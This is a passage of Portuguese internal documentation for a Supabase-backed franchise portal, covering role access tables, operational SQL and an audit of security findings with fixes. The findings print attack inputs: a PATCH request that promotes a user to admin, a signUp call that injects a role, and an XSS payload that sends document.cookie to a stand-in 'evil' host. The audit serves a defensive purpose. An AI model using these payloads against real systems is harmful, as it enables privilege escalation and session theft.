| `tg_calendarios_html_updated_at` | `calendarios_html` | BEFORE UPDATE | `tg_set_updated_at()` |

> Tabelas com coluna `updated_at` que **não** têm trigger: `comunicados`, `franquias`, `materiais`, `materiais_pastas`, `calendario_eventos`, `faq_perguntas`. Atualização precisa setar manualmente.

---

## 5. Matriz de acesso por role

Legenda: ✅ = permitido; ⚠️ = permitido com restrição (descrita na nota); ❌ = bloqueado; 🚫 = bloqueado por bug (RLS sem policy).

### 5.1. Leitura (SELECT)

| Tabela | franqueado | equipe_dm | gestao | Notas |
|---|---|---|---|---|
| `profiles` | ⚠️ próprio | ✅ todos | ✅ todos | franqueado só vê a si mesmo |
| `franquias` | ⚠️ vinculadas | ✅ todas | ✅ todas | filtro via `get_user_franquia_ids()` |
| `franqueado_franquias` | ⚠️ próprios | ✅ todos | ✅ todos | |
| `comunicados` | ⚠️ publicados | ✅ todos | ✅ todos | franqueado: status=publicado E (todos OU minhas franquias) |
| `comunicado_franquias` | ⚠️ próprias | ✅ todos | ✅ todos | |
| `comunicado_categorias` | ✅ | ✅ | ✅ | qualquer autenticado |
| `comunicado_categoria_rel` | ⚠️ visível | ✅ todos | ✅ todos | delega a `pode_ver_comunicado` |
| `comunicado_anexos` | ⚠️ visível | ✅ todos | ✅ todos | idem |
| `comunicado_leituras` | ⚠️ próprias | ✅ todas | ✅ todas | staff vê PII de leitura |
| `comunicado_reacoes` | ⚠️ próprias | ✅ todas | ✅ todas | staff vê PII de reação |
| `materiais_pastas` | ✅ | ✅ | ✅ | qualquer autenticado |
| `materiais` | ⚠️ todos+específicos | ✅ todos | ✅ todos | "específicos" hoje quebrado por 🚫 abaixo |
| `material_franquias` | 🚫 | 🚫 | 🚫 | RLS sem policy |
| `calendario_eventos` | ⚠️ todos+específicos | ✅ todos | ✅ todos | mesma quebra |
| `evento_franquias` | 🚫 | 🚫 | 🚫 | RLS sem policy |
| `faq_categorias` | ✅ | ✅ | ✅ | |
| `faq_perguntas` | ⚠️ só ativas | ✅ todas | ✅ todas | |
| `links_atalhos` | ⚠️ ativos+visíveis | ✅ ativos | ✅ ativos | `ativo=FALSE` invisível pra todos |
| `link_franquias` | 🚫 | 🚫 | 🚫 | RLS sem policy |
| `departamentos_suporte` | ✅ | ✅ | ✅ | |
| `departamentos_responsaveis` | ✅ | ✅ | ✅ | |
| `formulario_campos` | ✅ | ✅ | ✅ | |
| `sla_configuracoes` | ✅ | ✅ | ✅ | |
| `tickets` | ⚠️ por franquia | ⚠️ por departamento responsável | ✅ todos | franqueado vê TODOS os tickets da sua franquia, não só os dele |
| `ticket_mensagens` | ⚠️ ticket+não-interna | ⚠️ ticket+interna ok | ✅ todas | |
| `ticket_anexos` | ⚠️ via mensagem visível | ⚠️ todos do ticket | ✅ todos | |
| `calendarios_html` | ✅ todos | ✅ todos | ✅ todos | |
| `analytics.fct_eventos` | ❌ | ❌ | ✅ | único role com leitura |

### 5.2. Escrita (INSERT / UPDATE / DELETE)

| Tabela | franqueado | equipe_dm | gestao | Notas |
|---|---|---|---|---|
| `profiles` | ⚠️ UPDATE próprio | ⚠️ UPDATE próprio | ⚠️ UPDATE próprio | INSERT só via trigger; DELETE sem policy |
| `franquias` | ❌ | ❌ | ✅ INSERT/UPDATE | DELETE sem policy |
| `franqueado_franquias` | ❌ | ❌ | ⚠️ FOR ALL sem WITH CHECK | ver §12 |
| `comunicados` | ❌ | ✅ INSERT/UPDATE | ✅ INSERT/UPDATE/DELETE | |
| `comunicado_franquias` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `comunicado_categorias` | ❌ | ❌ | ✅ FOR ALL | |
| `comunicado_categoria_rel` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `comunicado_anexos` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `comunicado_leituras` | ⚠️ próprio (INSERT/UPDATE) | ⚠️ próprio | ⚠️ próprio | sem DELETE |
| `comunicado_reacoes` | ⚠️ próprio (todas) | ⚠️ próprio | ⚠️ próprio | |
| `materiais_pastas` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `materiais` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `material_franquias` | 🚫 | 🚫 | 🚫 | RLS sem policy |
| `calendario_eventos` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `evento_franquias` | 🚫 | 🚫 | 🚫 | RLS sem policy |
| `faq_categorias` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `faq_perguntas` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `links_atalhos` | ❌ | ✅ FOR ALL | ✅ FOR ALL | |
| `link_franquias` | 🚫 | 🚫 | 🚫 | RLS sem policy |
| `departamentos_suporte` | ❌ | ❌ | ✅ FOR ALL | |
| `departamentos_responsaveis` | ❌ | ❌ | ✅ FOR ALL | |
| `formulario_campos` | ❌ | ⚠️ se responsável | ✅ qualquer | |
| `sla_configuracoes` | ❌ | ⚠️ se responsável | ✅ qualquer | |
| `tickets` | ⚠️ INSERT próprio + UPDATE dono | ⚠️ INSERT livre + UPDATE se responsável | ✅ INSERT/UPDATE/DELETE | |
| `ticket_mensagens` | ⚠️ INSERT dono não-interna | ⚠️ INSERT responsável | ⚠️ INSERT qualquer | sem UPDATE/DELETE — imutáveis |
| `ticket_anexos` | ⚠️ INSERT dono | ⚠️ INSERT responsável | ⚠️ INSERT qualquer | sem UPDATE/DELETE |
| `calendarios_html` | ❌ | ✅ FOR ALL | ✅ FOR ALL | trocar ativo via `ativar_calendario()` |
| `analytics.fct_eventos` | ⚠️ INSERT próprio | ⚠️ INSERT próprio | ⚠️ INSERT próprio | imutáveis (sem UPDATE/DELETE) |

### 5.3. Storage

| Bucket | franqueado | equipe_dm | gestao | Notas |
|---|---|---|---|---|
| `comunicados` SELECT | ⚠️ via `pode_ver_comunicado(path)` | ✅ | ✅ | privado |
| `comunicados` INSERT/UPDATE/DELETE | ❌ | ✅ | ✅ | |
| `calendarios-html` SELECT (API auth) | ✅ | ✅ | ✅ | autenticado |
| `calendarios-html` SELECT (URL pública) | 🌍 qualquer um | 🌍 | 🌍 | **bucket público** — ver §11 |
| `calendarios-html` INSERT/UPDATE/DELETE | ❌ | ✅ | ✅ | |

---

## 6. Storage — buckets

### 6.1. Bucket `comunicados` (privado)

**Convenção de path** (definida em [`docs/modulo-comunicados.md`](modulo-comunicados.md) §7):

```
comunicados/{comunicado_id}/anexos/{filename}     ← anexos do comunicado
comunicados/{comunicado_id}/inline/{filename}     ← imagens inline do editor Tiptap
```

O primeiro segmento do path **deve** ser um UUID válido (o de um registro em `public.comunicados`). A função helper:

```sql
CREATE OR REPLACE FUNCTION public.comunicado_id_de_path(p_name TEXT)
RETURNS UUID
LANGUAGE sql
IMMUTABLE
SET search_path = ''
AS $$
  SELECT CASE
    WHEN split_part(p_name, '/', 1) ~ '^[0-9a-fA-F-]{36}$'
    THEN split_part(p_name, '/', 1)::uuid
    ELSE NULL
  END;
$$;
```

**Policies em `storage.objects`** (filtradas por `bucket_id = 'comunicados'`):

```sql
CREATE POLICY "lê arquivos do comunicado se vê o registro"
  ON storage.objects FOR SELECT
  USING (bucket_id = 'comunicados' AND public.pode_ver_comunicado(public.comunicado_id_de_path(name)));

CREATE POLICY "gestao e equipe_dm sobem arquivos"
  ON storage.objects FOR INSERT
  WITH CHECK (bucket_id = 'comunicados' AND public.get_user_role() IN ('gestao','equipe_dm'));

CREATE POLICY "gestao e equipe_dm atualizam arquivos"
  ON storage.objects FOR UPDATE
  USING (bucket_id = 'comunicados' AND public.get_user_role() IN ('gestao','equipe_dm'));

CREATE POLICY "gestao e equipe_dm removem arquivos"
  ON storage.objects FOR DELETE
  USING (bucket_id = 'comunicados' AND public.get_user_role() IN ('gestao','equipe_dm'));
```

**Recomendações de uso:**
- Default: **signed URL com TTL curto** (5–15 min) gerada server-side via Server Action.
- Imagens inline do editor Tiptap podem usar signed URL mais longa (1h) ou serializar como base64 no `conteudo_html` (custa banco).
- INSERT por equipe_dm **não valida** que o UUID do path corresponde a um comunicado existente — recomenda-se validar no Server Action antes de subir.
- Quando deletar comunicado, limpar os arquivos correspondentes (não há trigger automático).

### 6.2. Bucket `calendarios-html` (público) ⚠️

**Convenção de path:** `calendarios-html/{slug}.html` (slug em regex `^[a-z0-9]+(?:-[a-z0-9]+)*$`).

**Bucket marcado `public = TRUE`.** Implicações:

- Qualquer URL `https://<projeto>.supabase.co/storage/v1/object/public/calendarios-html/<slug>.html` é acessível sem auth.
- O Route Handler [`src/app/api/calendarios/[slug]/route.ts`](../src/app/api/calendarios/[slug]/route.ts) proxia o HTML com `Content-Type: text/html`, `Cache-Control: public, max-age=300` — **sem checar sessão**.
- As policies de `SELECT` em `storage.objects` para esse bucket (que exigem `auth.uid() IS NOT NULL`) **não se aplicam** ao acesso via URL pública — só ao endpoint `/object/authenticated/`.

**Vetor:** slugs são previsíveis (`calendario-marketing-junho-2026`). Atacante enumera e baixa conteúdo sem log. Achado documentado em §11.

**Policies de escrita:**

```sql
CREATE POLICY "calendarios_html_storage_insert"
  ON storage.objects FOR INSERT
  WITH CHECK (bucket_id = 'calendarios-html' AND public.get_user_role() IN ('equipe_dm','gestao'));

CREATE POLICY "calendarios_html_storage_update" ON storage.objects FOR UPDATE
  USING (bucket_id = 'calendarios-html' AND public.get_user_role() IN ('equipe_dm','gestao'))
  WITH CHECK (bucket_id = 'calendarios-html' AND public.get_user_role() IN ('equipe_dm','gestao'));

CREATE POLICY "calendarios_html_storage_delete"
  ON storage.objects FOR DELETE
  USING (bucket_id = 'calendarios-html' AND public.get_user_role() IN ('equipe_dm','gestao'));
```

---

## 7. Autenticação

### 7.1. Telas existentes

Todas em `src/app/(auth)/`. Layout do grupo é passthrough — sem Sidebar, sem auth guard.

| Rota | Tipo | API Supabase | Notas |
|---|---|---|---|
| `/login` | Client | `auth.signInWithPassword({ email, password })` | Restrição de domínio `@deliverymuch.com.br` é só UX no client |
| `/esqueci-senha` | Client | `auth.resetPasswordForEmail(email, { redirectTo: '/redefinir-senha' })` | Mensagem "expira em 1h" hardcoded |
| `/redefinir-senha` | Client | `auth.updateUser({ password })` | Roda sobre sessão de recovery materializada pelo `@supabase/ssr` |
| `/trocar-senha` | Server Component → Server Action | `auth.updateUser({ password })` + UPDATE em `profiles.senha_provisoria = false` | Gate de primeiro acesso quando `senha_provisoria=true` |

### 7.2. Auth guard atual — `src/proxy.ts`

```typescript
// src/proxy.ts (passthrough INTENCIONAL hoje)
export async function proxy(request: NextRequest) {
  return NextResponse.next({ request });
}
```

**Crítico:** o Next.js 16 (App Router) só executa middleware se o arquivo se chamar **`src/middleware.ts`**. O arquivo atual se chama `src/proxy.ts`, **então não roda middleware nenhum** — nem o passthrough. Toda proteção de rota hoje vem de redirects dentro dos Server Components, e o `(portal)/layout.tsx` quando não tem user **renderiza "Sem perfil"** ao invés de fazer redirect. O bloqueio efetivo vem da RLS retornando vazio.

**Para reativar:** renomear para `src/middleware.ts`, instanciar `createServerClient`, `auth.getUser()` + redirect `/login` em rotas `(portal)/*`.

### 7.3. Sessão

- Armazenamento: cookies HTTP (`sb-<project-ref>-auth-token`, possivelmente chunked). `localStorage` **não** é usado — `@supabase/ssr` usa cookies em ambos lados.
- Cookies marcados `httpOnly`, `Secure` (em prod), `SameSite=Lax`.
- TTL do JWT: 1 hora (padrão Supabase). Refresh token rotativo, inactivity timeout amplo (semanas).
- **Refresh automático server-side não ocorre fora de middleware** — sem `middleware.ts` ativo, refresh acontece apenas quando o browser detecta expiração ou quando um Server Component chama `getUser()`.
- **Logout do botão "Sair":** não chama `auth.signOut()` (achado em §11). Apenas `router.push('/login')`.

### 7.4. Templates de e-mail

Dois sistemas coexistindo:

**A) Templates nativos do Supabase Auth** (Dashboard → Authentication → Email Templates):

| Template | Quando dispara | Em uso no portal? |
|---|---|---|
| Confirm signup | `auth.signUp` sem auto-confirm | ❌ não há signup público |
| Invite user | "Send invitation" no dashboard | parcial — manual |
| Magic Link | `signInWithOtp` | ❌ |
| Change Email Address | `updateUser({ email })` | ❌ |
| Reset Password | `resetPasswordForEmail` | ✅ — único em uso |
| Reauthentication | operações sensíveis | ❌ |

Remetente default: `noreply@mail.app.supabase.io` (vai pra spam). **Recomendação:** configurar SMTP custom (Gmail SMTP do Workspace DM) em Dashboard → Project Settings → Authentication → SMTP Settings.

**B) Edge Function `enviar_email_acesso`** (SMTP via `smtp-relay.gmail.com:587` com App Password):

- Disparada pela Edge Function `admin_users` em `criar` e `redefinir_senha`.
- Templates `criacao` e `redefinicao` — enviam a senha em **texto plano** no corpo (achado §11).
- Autenticação: aceita apenas Bearer `SUPABASE_SERVICE_ROLE_KEY` — Edge → Edge.

### 7.5. Service role key — onde fica

**Nunca no Next.js.** `.env.local.example` lista apenas `NEXT_PUBLIC_SUPABASE_URL` e `NEXT_PUBLIC_SUPABASE_ANON_KEY`. Ambos os clients (`client.ts` e `server.ts`) usam anon key. `grep` confirma: `SUPABASE_SERVICE_ROLE_KEY` aparece **apenas** em comentários explicativos e dentro de `supabase/functions/*/index.ts` (Deno isolado).

---

## 8. Procedimentos operacionais

> Convenção: SQL roda no **SQL Editor** do Supabase Dashboard. Substituir placeholders `<...>` antes de executar.

### 8.1. Criar novo franqueado

1. Dashboard → Authentication → Users → **Add user → Create new user**.
2. Preencher e-mail + senha temporária. **Marcar `Auto Confirm User`**.
3. Clicar Create. A trigger `on_auth_user_created` cria automaticamente o `profile` com `role = 'franqueado'`.
4. Ajustar nome amigável + vincular franquias:

```sql
UPDATE public.profiles
SET nome = '<Nome Completo>', updated_at = NOW()
WHERE id = '<user_id>';

INSERT INTO public.franqueado_franquias (user_id, franquia_id)
VALUES
  ('<user_id>', '<franquia_id_1>'),
  ('<user_id>', '<franquia_id_2>')
ON CONFLICT (user_id, franquia_id) DO NOTHING;
```

5. Conferência:

```sql
SELECT p.id, p.nome, p.email, p.role, p.ativo,
       ARRAY_AGG(f.nome) AS franquias
FROM public.profiles p
LEFT JOIN public.franqueado_franquias ff ON ff.user_id = p.id
LEFT JOIN public.franquias f ON f.id = ff.franquia_id
WHERE p.id = '<user_id>'
GROUP BY p.id;
```

### 8.2. Criar usuário equipe_dm

Mesmo fluxo de criação no Dashboard. Depois promover:

```sql
UPDATE public.profiles
SET role         = 'equipe_dm',
    departamento = 'marketing',  -- marketing | financeiro | tecnologia | operacional | juridico
    nome         = '<Nome Completo>',
    updated_at   = NOW()
WHERE id = '<user_id>';
```

`equipe_dm` **não** precisa de vínculo em `franqueado_franquias`.

### 8.3. Promover a `gestao`

```sql
UPDATE public.profiles
SET role         = 'gestao',
    departamento = NULL,
    updated_at   = NOW()
WHERE id = '<user_id>';
```

Auditoria — quem é gestão hoje:

```sql
SELECT id, nome, email, created_at
FROM public.profiles
WHERE role = 'gestao'
ORDER BY created_at;
```

### 8.4. Convidar por e-mail (Magic Invite)

1. Dashboard → Authentication → Users → **Add user → Send invitation**.
2. Informar e-mail. Supabase envia o template "Invite user".
3. Usuário clica → cai em `/redefinir-senha` → cria senha.
4. Trigger já criou o `profile` com `role='franqueado'`. Se for `equipe_dm`/`gestao`, rodar UPDATE depois. Vincular franquias se for franqueado.

> Limite SMTP padrão: ~30 e-mails/hora. Para convites em lote, configurar SMTP custom antes.

### 8.5. Resetar senha (admin)

**A) Disparar link para o usuário:** Dashboard → Users → três pontos → **Send password recovery**.

**B) Forçar senha nova manualmente (sem e-mail):** Dashboard → clicar no usuário → aba **Reset password** → digitar nova → **Update password**.

**C) Via Edge Function (com flag senha_provisoria):** chamar `redefinirSenhaAction` em `/admin/usuarios` — invoca `admin_users` que faz `admin.auth.admin.updateUserById(...)` + UPDATE em `profiles.senha_provisoria = TRUE` + dispara email via `enviar_email_acesso`.

> Não existe SQL direto para alterar senha — `auth.users.encrypted_password` é gerenciado pelo GoTrue. **Nunca** tentar UPDATE direto.

### 8.6. Desativar usuário

Duas camadas independentes:

| Camada | Onde | Efeito |
|---|---|---|
| `profiles.ativo = false` | App | Hoje a RLS **não** consulta `ativo` — serve só de flag de UI |
| `auth.users.banned_until` | Supabase Auth | Bloqueia login efetivo |

**Desativação completa (recomendado):**

```sql
UPDATE public.profiles SET ativo = FALSE, updated_at = NOW() WHERE id = '<user_id>';

UPDATE auth.users SET banned_until = NOW() + INTERVAL '100 years' WHERE id = '<user_id>';
```

**Reativar:**

```sql
UPDATE public.profiles SET ativo = TRUE, updated_at = NOW() WHERE id = '<user_id>';
UPDATE auth.users SET banned_until = NULL WHERE id = '<user_id>';
```

**Excluir definitivamente (irreversível):**

```sql
-- Reatribuir conteúdo antes (criado_por sem ON DELETE)
UPDATE public.comunicados     SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.materiais       SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.materiais_pastas SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.calendario_eventos SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
UPDATE public.faq_perguntas   SET criado_por = '<gestao_id>' WHERE criado_por = '<user_id>';
-- Aí sim:
DELETE FROM auth.users WHERE id = '<user_id>';  -- cascateia para profiles, franqueado_franquias, etc.
```

### 8.7. Backup e Disaster Recovery (plano Free)

- **Backups automáticos:** diários, retidos por 7 dias. Restore só via ticket de suporte Supabase (lento). Para PITR ágil, plano Pro ($25/mês).
- **Backup manual recomendado semanal:**

```bash
supabase db dump --project-ref gplxnzgsculryjykbcuo \
  --db-url "postgresql://postgres:<senha>@db.gplxnzgsculryjykbcuo.supabase.co:5432/postgres" \
  -f backup-$(date +%Y%m%d).sql
```

- **Storage:**

```bash
supabase storage cp -r ss:///comunicados ./backup-comunicados-$(date +%Y%m%d)/
supabase storage cp -r ss:///calendarios-html ./backup-calendarios-$(date +%Y%m%d)/
```

- **Armazenar dump em local cifrado** (Google Drive corporativo da DM). **Nunca commitar no git** — contém dados de usuário (LGPD).
- **Restore:** novo projeto Supabase → `supabase db push` → `psql < backup.sql` → reupload Storage → reconfigurar SMTP/URLs.

### 8.8. Editar templates de e-mail

**Templates Supabase nativos:** Dashboard → Authentication → Email Templates → editar HTML com tokens da DM (cor `#af101a` ou nova brand, logo).

**Configurar SMTP custom (Gmail Workspace):**
Dashboard → Project Settings → Authentication → SMTP Settings → Enable Custom SMTP:

```
Host:        smtp.gmail.com
Port:        587
Username:    <conta dedicada>@deliverymuch.com.br
Password:    <App Password de 16 dígitos>
Sender:      <conta dedicada>@deliverymuch.com.br
Sender Name: Delivery Much
```

**URLs de redirect:** Authentication → URL Configuration:
- Site URL: `https://<domínio-prod>`
- Redirect URLs allow list: `https://<domínio-prod>/redefinir-senha`, `http://localhost:3000/redefinir-senha`

### 8.9. Acesso ao Dashboard e SQL Editor

SQL Editor usa **service role implícito** — bypassa RLS. Membership em Project Settings → Team.

| Role no Dashboard | Pode |
|---|---|
| Owner | Tudo, incl. delete e billing |
| Administrator | Tudo exceto billing/delete |
| Developer | SQL Editor, migrations, deploys |
| Read-Only | Ler tabelas |

**Regra DM:**
- 1 Owner (CTO/eng. principal).
- 1–2 Administrators (time backend).
- 1 Developer (dev backend ativo).
- N Read-Only (analistas).
- **Franqueados nunca têm acesso ao Dashboard.**

**Service role key:** rotacionar imediatamente se vazar (Project Settings → API → Reset service_role secret).

### 8.10. Logs (Dashboard → Logs Explorer)

| Log source | Para que serve |
|---|---|
| API logs (PostgREST) | chamadas `from('tabela')` |
| Auth logs | login/logout/reset; brute force |
| Postgres logs | erros DB, slow queries, lock |
| Edge Function logs | `console.log` das funções |
| Storage logs | upload/download/delete |

Retenção no Free: **1 dia**. Pro: 7 dias.

---

## 9. Padrão de analytics

### 9.1. Schema

Tabela `analytics.fct_eventos` — event sourcing leve, imutável.

```sql
INSERT INTO analytics.fct_eventos (evento, user_id, role, payload, ocorreu_em)
VALUES (...);
```

**Convenções:**
- `evento`: snake_case + verbo no passado (`pagina_aberta`, `comunicado_lido`, `material_baixado`).
- `payload`: JSONB com propriedades específicas. Catálogo de eventos em `docs/analytics-eventos.md` quando criado.
- `role`: snapshot do papel no momento do evento (útil quando user muda de role).

### 9.2. Server Action `rastrear`

[`src/lib/analytics/track.ts`](../src/lib/analytics/track.ts):

```typescript
"use server";
export async function rastrear(
  evento: string,
  payload?: Record<string, unknown>
): Promise<void> {
  const supabase = await createClient();
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return; // silent — best-effort
  // SELECT role + INSERT
}
```

- Erros são engolidos silenciosamente (warning em dev). Não bloqueia UX.
- Chamadores: `PageViewTracker` (todas as páginas), `ComunicadoDetalhePage`, `MaterialDownloadLink`.

### 9.3. Quem lê e quem escreve

- **INSERT:** qualquer authenticated (com `WITH CHECK user_id = auth.uid()`).
- **SELECT:** apenas `gestao`.
- **UPDATE/DELETE:** ninguém — sem policies.

> ⚠️ Achado: o cliente controla os campos `evento`, `role` e `payload` no INSERT. Recomenda-se trigger BEFORE INSERT que sobrescreva `role` com `(SELECT role FROM profiles WHERE id = auth.uid())` para prevenir falsificação. Ver §11.

---

## 10. Padrões de código

### 10.1. Cliente Supabase: client vs server

- **Browser:** `src/lib/supabase/client.ts` — `createBrowserClient<Database>` com anon key. Hoje usado apenas em telas de Auth.
- **Server:** `src/lib/supabase/server.ts` — `createServerClient<Database>` com cookie bridge (`next/headers cookies()`). Usado em Server Components, Server Actions, Route Handlers.
- **Sem React Query / SWR / Zustand.** Padrão consistente.
- **Type `Database`** definido em [`src/lib/types.ts`](../src/lib/types.ts). Toda nova tabela precisa entrar lá (ou gerar via `supabase gen types`).

### 10.2. Server Actions

Padrão atual (4 arquivos):

| Arquivo | Ações | Estratégia |
|---|---|---|
| `src/app/trocar-senha/actions.ts` | `trocarSenhaAction` | Self-service: `auth.updateUser` + UPDATE em `profiles.senha_provisoria` |
| `src/app/(portal)/admin/calendarios/actions.ts` | `criar/ativar/desativar/atualizar/excluirCalendarioAction` | Roda como o user; gate `verificarAcessoAdmin` (role=`equipe_dm`/`gestao`) antes; Storage + RPC `ativar_calendario` |
| `src/app/(portal)/admin/usuarios/actions.ts` | `criar/atualizar/desativar/ativar/redefinirSenha/excluirUsuarioAction` | **Repassa para Edge Function** `admin_users` com Bearer JWT |
| `src/lib/analytics/track.ts` | `rastrear` | INSERT direto em `analytics.fct_eventos` |

**Invariantes:**
- Sempre `auth.getUser()` antes de `auth.getSession()` (revalida com Auth Server).
- Conferir `role` server-side mesmo quando RLS já cobre (defesa em profundidade).
- Nunca passar service role para o cliente.
- Operações privilegiadas → Edge Function autorizada por JWT do user.

### 10.3. Mock-first

Estágio atual: **Auth, Calendário, Admin Usuários** consomem Supabase real. **Comunicados, Helpdesk, Notificações, Materiais, FAQ, Links** ainda vivem em mock + localStorage.

| Store | Arquivo | localStorage keys |
|---|---|---|
| Comunicados | `src/lib/comunicados-store.ts` | `dm-comunicados-locais`, `dm-comunicados-lidos`, `dm-comunicados-reacoes`, `dm-comunicado-categorias-locais` |
| Helpdesk | `src/lib/suporte-store.ts` | `dm-suporte-tickets-locais`, `dm-suporte-tickets-completos`, `dm-suporte-mensagens`, `dm-suporte-mensagens-removidas`, `dm-suporte-log-auditoria` |
| Notificações | `src/lib/notificacoes-store.ts` | `dm-notificacoes-lidas`, `dm-notificacoes-locais` |

**Regra:** quando criar tabela nova no Supabase, **adicionar mock equivalente** em `src/lib/mock-data.ts` com o mesmo formato (mesmos campos, mesmos tipos). Isso garante que a troca para Supabase seja só substituição de origem.

---

## 11. Riscos abertos — achados críticos / altos / médios

### 11.1. 🔴 CRÍTICO — Auto-promoção a `gestao` via UPDATE direto em `profiles`

**Local:** `supabase/migrations/20260505000000_initial_schema.sql` — policy `"usuario atualiza próprio perfil"`.

**Descrição:** A policy é `FOR UPDATE USING (id = auth.uid())` **sem `WITH CHECK`** e **sem whitelist de colunas**. Qualquer franqueado autenticado pode executar via PostgREST com anon key + seu próprio JWT:

```http
PATCH /rest/v1/profiles?id=eq.<meu_uuid>
Authorization: Bearer <meu_jwt>
apikey: <anon_key>
Content-Type: application/json
Prefer: return=minimal

{"role": "gestao"}
```

Em 1 request o franqueado vira `gestao`. O CHECK constraint aceita `'gestao'` como valor válido sem outras validações.

**Impacto:** Comprometimento **total** do modelo de roles. Atacante ganha CRUD de usuários via Edge Function `admin_users`, acesso a todas as franquias, exclusão de comunicados e tickets, leitura de `analytics.fct_eventos`. RLS inteiro do portal cai.

**Remediação:**

```sql
-- Versão segura
DROP POLICY "usuario atualiza próprio perfil" ON public.profiles;

CREATE POLICY "usuario atualiza próprio perfil"
  ON public.profiles FOR UPDATE
  USING (id = auth.uid())
  WITH CHECK (
    id = auth.uid()
    AND role         = (SELECT role         FROM public.profiles WHERE id = auth.uid())
    AND ativo        = (SELECT ativo        FROM public.profiles WHERE id = auth.uid())
    AND departamento IS NOT DISTINCT FROM (SELECT departamento FROM public.profiles WHERE id = auth.uid())
  );

CREATE POLICY "gestao gerencia perfis"
  ON public.profiles FOR ALL
  USING (get_user_role() = 'gestao')
  WITH CHECK (get_user_role() = 'gestao');
```

Alternativa mais robusta: trigger BEFORE UPDATE que rejeita mudança em `role`/`departamento`/`ativo`/`email` quando o caller não é service role.

---

### 11.2. 🔴 CRÍTICO — `handle_new_user` aceita `role` do `raw_user_meta_data` no signup

**Local:** `supabase/migrations/20260505000000_initial_schema.sql` — função `public.handle_new_user`.

**Descrição:**

```sql
INSERT INTO public.profiles (id, nome, email, role)
VALUES (
  NEW.id,
  COALESCE(NEW.raw_user_meta_data->>'nome', split_part(NEW.email, '@', 1)),
  NEW.email,
  COALESCE(NEW.raw_user_meta_data->>'role', 'franqueado')  -- ← CONTROLADO PELO CLIENTE
);
```

Se signup público estiver habilitado, qualquer pessoa faz `supabase.auth.signUp({ email, password, options: { data: { role: 'gestao' } } })` e nasce gestor.

**Impacto:** Comprometimento total se signup público estiver aberto (default em projetos novos do Supabase).

**Remediação:** forçar role fixo dentro de `handle_new_user`:

```sql
CREATE OR REPLACE FUNCTION public.handle_new_user()
RETURNS TRIGGER LANGUAGE plpgsql SECURITY DEFINER
SET search_path = public AS $$
BEGIN
  INSERT INTO public.profiles (id, nome, email, role)
  VALUES (
    NEW.id,
    COALESCE(NEW.raw_user_meta_data->>'nome', split_part(NEW.email, '@', 1)),
    NEW.email,
    'franqueado'  -- ← FIXO. Promoção via Edge Function admin.
  );
  RETURN NEW;
END;
$$;
```

**E** desabilitar signup público no Dashboard → Authentication → Providers → Email → desligar "Enable Signups".

---

### 11.3. 🔴 CRÍTICO — XSS armazenado via `dangerouslySetInnerHTML` em comunicados

**Local:** [`src/app/(portal)/comunicados/[id]/page.tsx:170`](../src/app/(portal)/comunicados/[id]/page.tsx).

**Descrição:**

```tsx
<article dangerouslySetInnerHTML={{ __html: c.conteudo_html || "<p><em>Sem conteúdo.</em></p>" }} />
```

Sem sanitização. Hoje o conteúdo vem do TipTap (que sanitiza o que entra no editor), mas:
- (a) Conteúdo persistido em localStorage hoje — extensão hostil pode escrever HTML arbitrário.
- (b) Quando migrar para Supabase, equipe_dm com INSERT permitido pode armazenar `<img src=x onerror="fetch('//evil/?'+document.cookie)">`.
- (c) Cookie `sb-*-auth-token` é manipulado pelo `@supabase/ssr` no client (não é httpOnly puro no client) — XSS = takeover de sessão.

**Impacto:** Roubo de sessão de qualquer usuário que abrir o comunicado contaminado. Combinado com #11.1, persistência + escalonamento.

**Remediação:**
- Sanitizar com **DOMPurify** ou **sanitize-html** (whitelist alinhada ao TipTap) antes do `dangerouslySetInnerHTML` — preferencialmente server-side.
- Adicionar CSP à rota `/comunicados` (`script-src 'self'` sem `'unsafe-inline'`).
- CHECK constraint de tamanho em `comunicados.conteudo_html` (ex: ≤ 200000 chars).

---

### 11.4. 🟠 ALTO — Bucket `calendarios-html` público sem ACL

**Local:** `supabase/migrations/20260528010000_calendarios_html.sql` — bucket criado com `public = TRUE`.

**Descrição:** Qualquer URL `https://<projeto>.supabase.co/storage/v1/object/public/calendarios-html/<slug>.html` é acessível sem auth. Slugs previsíveis (`calendario-marketing-junho-2026`). Route Handler `/api/calendarios/[slug]` não chama `getUser()`.

**Impacto:** Vazamento de calendarios institucionais para a internet aberta. Concorrentes podem enumerar slugs e baixar material antes de campanha. Compliance leve.

**Remediação:**
- Mudar bucket para `public = FALSE`. Usar `createSignedUrl` no Server Component que monta o iframe (TTL 8h, renovado).
- **OU** manter público e tornar slug imprevisível: `{slug}-{nanoid(16)}` no path, expor o token só dentro do portal.

---

### 11.5. 🟠 ALTO — Tabelas de visibilidade granular com RLS sem policy (deny-all)

**Local:** `public.material_franquias`, `public.evento_franquias`, `public.link_franquias` — `ALTER TABLE ... ENABLE ROW LEVEL SECURITY` sem nenhuma `CREATE POLICY`.

**Descrição:** RLS habilitado + sem policy = deny-all. As subqueries dentro das policies de `materiais`, `calendario_eventos` e `links_atalhos` retornam vazio para qualquer authenticated. Feature de visibilidade granular `'especifico'` está **quebrada** — franqueado nunca vê material/evento/link específico direcionado a ele.

**Impacto:** Bug funcional disfarçado de regra de segurança. Operadores tendem a "consertar" marcando tudo como `visibilidade='todos'`, expondo mais do que deveriam. Quando reativada via service role no backend, perde-se defesa em profundidade.

**Remediação:** espelhar o padrão de `comunicado_franquias`:

```sql
CREATE POLICY "lê vínculo se vê franquia"
  ON public.material_franquias FOR SELECT
  USING (get_user_role() IN ('gestao','equipe_dm') OR franquia_id = ANY(get_user_franquia_ids()));

CREATE POLICY "gestao e equipe_dm gerenciam vínculos de material"
  ON public.material_franquias FOR ALL
  USING (get_user_role() IN ('gestao','equipe_dm'))
  WITH CHECK (get_user_role() IN ('gestao','equipe_dm'));

-- Repetir para evento_franquias e link_franquias
```

---
